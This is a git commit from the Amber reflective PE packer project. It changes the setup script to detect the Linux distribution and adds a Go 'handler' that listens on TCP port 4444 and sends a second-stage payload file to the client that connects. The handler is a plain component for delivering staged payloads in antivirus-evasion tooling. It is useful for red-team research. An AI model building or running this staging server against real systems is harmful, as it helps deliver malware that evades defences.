9cd29bfc8e4d0a45a619de80c61e9c7163e92281
EgeBalci <egebal1996@gmail.com>
2017-08-28 14:25:59 +0300

    - Added OS support to setup script - handler readded

--- Setup.sh
+++ Setup.sh
@@ -1,42 +1,106 @@
 #!/bin/bash
 
+# Reset
+Color_Off='\033[0m'       # Text Reset
 
-tput setaf 1;
+# Regular Colors
+Black='\033[0;30m'        # Black
+Red='\033[0;31m'          # Red
+Green='\033[0;32m'        # Green
+Yellow='\033[0;33m'       # Yellow
+Blue='\033[0;34m'         # Blue
+Purple='\033[0;35m'       # Purple
+Cyan='\033[0;36m'         # Cyan
+White='\033[0;37m'        # White
+
+# Bold
+BBlack='\033[1;30m'       # Black
+BRed='\033[1;31m'         # Red
+BGreen='\033[1;32m'       # Green
+BYellow='\033[1;33m'      # Yellow
+BBlue='\033[1;34m'        # Blue
+BPurple='\033[1;35m'      # Purple
+BCyan='\033[1;36m'        # Cyan
+BWhite='\033[1;37m'       # White
+
+# Underline
+UBlack='\033[4;30m'       # Black
+URed='\033[4;31m'         # Red
+UGreen='\033[4;32m'       # Green
+UYellow='\033[4;33m'      # Yellow
+UBlue='\033[4;34m'        # Blue
+UPurple='\033[4;35m'      # Purple
+UCyan='\033[4;36m'        # Cyan
+UWhite='\033[4;37m'       # White
+
+# Background
+On_Black='\033[40m'       # Black
+On_Red='\033[41m'         # Red
+On_Green='\033[42m'       # Green
+On_Yellow='\033[43m'      # Yellow
+
+
+#tput setaf 1;
+echo -e -n $BRed
 echo "//   █████╗ ███╗   ███╗██████╗ ███████╗██████╗ "
 echo "//  ██╔══██╗████╗ ████║██╔══██╗██╔════╝██╔══██╗"
 echo "//  ███████║██╔████╔██║██████╔╝█████╗  ██████╔╝"
 echo "//  ██╔══██║██║╚██╔╝██║██╔══██╗██╔══╝  ██╔══██╗"
 echo "//  ██║  ██║██║ ╚═╝ ██║██████╔╝███████╗██║  ██║"
 echo "//  ╚═╝  ╚═╝╚═╝     ╚═╝╚═════╝ ╚══════╝╚═╝  ╚═╝"
-echo "//  POC Packer For Ophio              "     
-echo " "
-tput setaf 2;echo "Author: Ege Balcı"
-tput setaf 4;echo "Source: github.com/EgeBalci/Amber"
+echo "//  POC Reflective PE Packer              "     
+#echo -e " "$Color_Off
 
-echo " "
-echo " "
-echo " "
-tput setaf 3;echo "[*] Installing dependencies..."
-tput setaf 7;
+echo -e  $Blue
+echo "Author: Ege Balcı"
+echo -e -n $Green
+echo "Source: github.com/egebalci/Amber"
 
-sudo apt-get update
-sudo apt-get install -y golang nasm mingw-w64-i686-dev mingw-w64-tools mingw-w64-x86-64-dev mingw-w64-common mingw-w64 mingw-ocaml gcc-multilib g++-multilib
 
-tput setaf 3;echo "[*] Cloning git tools..."
+### Getting OS Information
+if [ -f /etc/lsb-release ]; then
+	. /etc/lsb-release
+	DIST=$DISTRIB_ID
+	DIST_VER=$DISTRIB_RELEASE
+else
+	DIST="Unknown"
+	DIST_VER="Unknown"
+fi
+
+echo -e $BYellow
+echo "[*] OS Distro: "$DIST
+echo "[*] Distro Version: "$DIST_VER
+echo -e $Yellow
+echo "[*] Installing dependencies..."
+echo -e $Color_Off 
+
+
+
+if [ $DIST == "Ubuntu" ] || [ $DIST == "Kali" ] || [ $DIST == "Mint" ]
+then
+	sudo apt-get update
+	sudo apt-get install -y golang nasm mingw-w64-i686-dev mingw-w64-tools mingw-w64-x86-64-dev mingw-w64-common mingw-w64 mingw-ocaml gcc-multilib g++-multilib
+elif [ $DIST == "Arch" ] || [ $DIST == "Manjaro" ]
+then
+	packman -S -y golang nasm mingw-w64-i686-dev mingw-w64-tools mingw-w64-x86-64-dev mingw-w64-common mingw-w64 mingw-ocaml gcc-multilib g++-multilib
+fi
+
+echo -e $Yellow
+echo "[*] Installing libraries..."
 
 export AMBERPATH=$(pwd)
 cd lib
 export GOPATH=$(pwd)
 cd ..
 
-tput setaf 3;echo "[*] AMBERPATH=$AMBERPATH"
-tput setaf 3;echo "[*] GOPATH=$GOPATH"
-
+echo "[*] AMBERPATH=$AMBERPATH"
+echo "[*] GOPATH=$GOPATH"
+echo -e -n $Color_Off
 cd src
 go build -ldflags "-s -w" -o amber
 cd ..
 mv src/amber ./
-go build -ldflags "-s -w" src/handler.go
+go build -ldflags "-s -w" handler.go
 
 #sudo ln amber /usr/local/bin/amber
 
@@ -46,6 +110,6 @@ echo "./amber \$@" >> /tmp/amber
 sudo mv /tmp/amber /usr/local/bin/
 sudo chmod 777 /usr/local/bin/amber
 
-
-tput setaf 4;echo "[+] Setup completed !"
+echo -e $BGreen
+echo "[+] Setup completed !"
 
---
+++ handler.go
@@ -0,0 +1,121 @@
+package main
+
+
+import "github.com/fatih/color"
+import "encoding/binary"
+import "io/ioutil"
+import "strconv"
+import "net"
+import "fmt"
+import "os"
+
+
+
+var Red *color.Color = color.New(color.FgRed)
+var BoldRed *color.Color = Red.Add(color.Bold)
+var	Blue *color.Color = color.New(color.FgBlue)
+var	BoldBlue *color.Color = Blue.Add(color.Bold)
+var	Yellow *color.Color = color.New(color.FgYellow)
+var	BoldYellow *color.Color = Yellow.Add(color.Bold)
+var	Green *color.Color = color.New(color.FgGreen)
+var	BoldGreen *color.Color = Green.Add(color.Bold)
+
+
+const VERSION string = "1.0.0"
+
+
+func main() {
+
+	var PORT string = "4444"
+
+ 	ARGS := os.Args[1:]
+  	if len(ARGS) == 0 || ARGS[0] == "--help" || ARGS[0] == "-h"{
+    	Banner()
+    	Help()
+    	os.Exit(0)
+  	}
+
+  	for i := 0; i < len(ARGS); i++{
+  		if ARGS[i] == "-p" || ARGS[i] == "--port" {
+  			tmp, Err := strconv.Atoi(ARGS[i+1])
+      		if Err != nil || tmp < 0 || tmp > 65535 {
+        		BoldRed.Println("\n[!] ERROR: Invalid port number.\n")
+        		fmt.Println(Err)
+        		os.Exit(1)
+      		}else{
+        		PORT = ARGS[i+1]
+      		} 
+  		}
+  	}
+
+  	File, Err := ioutil.ReadFile(ARGS[0])
+  	if Err != nil {
+  		BoldRed.Println("\n[!] ERROR: Can't open the file :(")
+  		os.Exit(1)
+  	}
+
+  	stageSize := make([]byte, 4)
+    binary.LittleEndian.PutUint32(stageSize, uint32(len(File)))
+
+  	sock, sockErr := net.Listen("tcp", ":"+PORT)
+  	if sockErr != nil {
+        BoldRed.Println("\n[!] ERROR: Invalid port number.\n")
+       	fmt.Println(sockErr)
+       	os.Exit(1) 			
+  	}
+  	BoldYellow.Print("[*] Listening on port ",PORT,"\n")
+  	conn, connErr := sock.Accept()
+  	if connErr != nil {
+        BoldRed.Println("\n[!] ERROR: Connection error.\n")
+       	fmt.Println(connErr)
+       	os.Exit(1) 			
+  	}
+  	BoldYellow.Print("[*] Sending second stage (",len(File),")\n")  	
+  	conn.Write([]byte(stageSize))
+  	conn.Write(File)
+
+  	BoldGreen.Println("\n[+] Stage send !")
+}
+
+
+
+func Banner() {
+
+  	var BANNER string = `
+
+
+//    _____         ___.                    ___ ___                    .___.__                
+//   /  _  \   _____\_ |__   ___________   /   |   \_____    ____    __| _/|  |   ___________ 
+//  /  /_\  \ /     \| __ \_/ __ \_  __ \ /    ~    \__  \  /    \  / __ | |  | _/ __ \_  __ \
+// /    |    \  Y Y  \ \_\ \  ___/|  | \/ \    Y    // __ \|   |  \/ /_/ | |  |_\  ___/|  | \/
+// \____|__  /__|_|  /___  /\___  >__|     \___|_  /(____  /___|  /\____ | |____/\___  >__|   
+//         \/      \/    \/     \/               \/      \/     \/      \/           \/       
+// 
+//  POC handler For ReplaceProcess                                             
+`
+  BoldRed.Print(BANNER)
+  BoldBlue.Print("\n# Version: ")
+  BoldGreen.Println(VERSION)
+  BoldBlue.Print("# Source: ")
+  BoldGreen.Println("github.com/EgeBalci/Amber")
+  
+}
+	
+func Help() {
+   var Help string = `
+
+USAGE: 
+  amber file.stage [options]
+
+OPTIONS:  
+  -p, --port             Custom cipher key
+  -h, --help             Show this massage
+
+EXAMPLE:
+  (Default settings if no option parameter passed)
+  amber file.stage -p 4444
+
+`
+  color.Green(Help)
+
+}
